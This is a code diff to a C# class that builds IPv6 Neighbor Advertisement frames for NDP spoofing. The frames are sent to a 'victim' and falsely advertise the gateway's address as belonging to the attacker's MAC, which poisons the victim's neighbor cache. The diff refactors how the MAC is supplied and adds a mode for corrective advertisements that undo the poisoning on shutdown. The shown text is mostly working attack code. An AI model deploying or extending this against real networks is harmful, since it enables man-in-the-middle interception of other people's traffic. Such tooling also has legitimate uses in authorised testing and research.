@@ -1,4 +1,3 @@
-using SharpPcap;
 using System.Net;
 using System.Net.NetworkInformation;
 
@@ -14,7 +13,7 @@ using System.Net.NetworkInformation;
 /// </summary>
 class Ndp_Class
 {
-    private readonly ILiveDevice liveDevice;
+    private readonly PhysicalAddress ourMac;
 
     // Neighbor Advertisement flags (RFC 4861 §4.4): Solicited (0x40) + Override
     // (0x20). Override tells the receiver to replace any cached entry.
@@ -27,9 +26,9 @@ class Ndp_Class
     private const byte TargetLinkLayerAddressOption = 0x02;
     private const byte OptionLengthInEightByteUnits = 0x01;
 
-    public Ndp_Class(ILiveDevice pLiveDevice)
+    public Ndp_Class(PhysicalAddress pOurMac)
     {
-        liveDevice = pLiveDevice;
+        ourMac = pOurMac;
     }
 
     /// <summary>
@@ -37,12 +36,17 @@ class Ndp_Class
     /// Advertisement for <paramref name="pSpoofedIp"/>, addressed to the victim.
     /// </summary>
     /// <param name="pVictimIp">Destination IPv6 address (the victim).</param>
-    /// <param name="pSpoofedIp">The IPv6 address we claim to own (the gateway).</param>
+    /// <param name="pSpoofedIp">The IPv6 address being advertised (typically the gateway).</param>
     /// <param name="pVictimMac">The victim's hardware address.</param>
+    /// <param name="pAdvertisedMac">
+    /// The link-layer address to advertise for <paramref name="pSpoofedIp"/>. Defaults to this machine's
+    /// MAC (the spoofing case). Pass the real owner's MAC to build a corrective advertisement that repairs
+    /// a poisoned neighbor cache on shutdown.
+    /// </param>
     /// <returns>Ready-to-send wire bytes of the Ethernet frame.</returns>
-    public byte[] BuildNeighborAdvertisement(IPAddress pVictimIp, IPAddress pSpoofedIp, PhysicalAddress pVictimMac)
+    public byte[] BuildNeighborAdvertisement(IPAddress pVictimIp, IPAddress pSpoofedIp, PhysicalAddress pVictimMac, PhysicalAddress? pAdvertisedMac = null)
     {
-        PhysicalAddress ourMac = liveDevice.MacAddress;
+        PhysicalAddress advertisedMac = pAdvertisedMac ?? ourMac;
 
         // --- ICMPv6 Neighbor Advertisement message (32 bytes) ---
         // [0..4)  type, code, checksum
@@ -57,7 +61,7 @@ class Ndp_Class
         Buffer.BlockCopy(pSpoofedIp.GetAddressBytes(), 0, icmp, 8, 16);
         icmp[24] = TargetLinkLayerAddressOption;
         icmp[25] = OptionLengthInEightByteUnits;
-        Buffer.BlockCopy(ourMac.GetAddressBytes(), 0, icmp, 26, 6);
+        Buffer.BlockCopy(advertisedMac.GetAddressBytes(), 0, icmp, 26, 6);
 
         ushort checksum = PacketUtil_Class.ComputeIcmpV6Checksum(pSpoofedIp, pVictimIp, icmp);
         icmp[2] = (byte)(checksum >> 8);
